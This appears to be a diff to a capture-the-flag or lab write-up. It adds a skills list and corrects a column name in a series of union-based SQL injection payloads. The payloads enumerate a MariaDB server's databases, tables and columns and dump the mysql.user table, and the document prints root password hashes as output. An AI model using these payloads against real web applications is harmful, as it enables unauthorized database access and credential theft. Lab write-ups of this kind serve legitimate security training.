@@ -1,3 +1,12 @@
+**Skills Required**
+Enumeration
+JavaScript XSS Payloads
+SQL Injection
+**Skills Learned**
+Command Injection
+File read through SQLi
+Buffer Overflow
+
 Port 80 (http)
 port 445 (smb)
 port 443(https)
@@ -83,7 +92,7 @@ Now that I can log in as Admin in the web application, I found a "Search Users" 
 1' union select 1,version(),3-- - (the MariaDB version)
 1' union select 1,schema_name,3 from information_schema.schemata-- - (list existing dtabases)
 1' union select 1,table_name,3 from information_schema.tables where table_schema="mysql"-- - (enumerate tables from database mysql)
-1' union select 1,column_name,3 from information_schema.columns where tables_schema="mysql" and table_name="user"-- - (enumerate columns from database mysql)
+1' union select 1,column_name,3 from information_schema.columns where table_schema="mysql" and table_name="user"-- - (enumerate columns from database mysql)
 1' union select 1,group_concat(User,":",Password),3 from mysql.user-- - (enumerate existing users ands passwords)
 root:*F435725A173757E57BD36B09048B8B610FF4D0C4,root:*F435725A173757E57BD36B09048B8B610FF4D0C4,root:*F435725A173757E57BD36B09048B8B610FF4D0C4,:,pma:
 ```
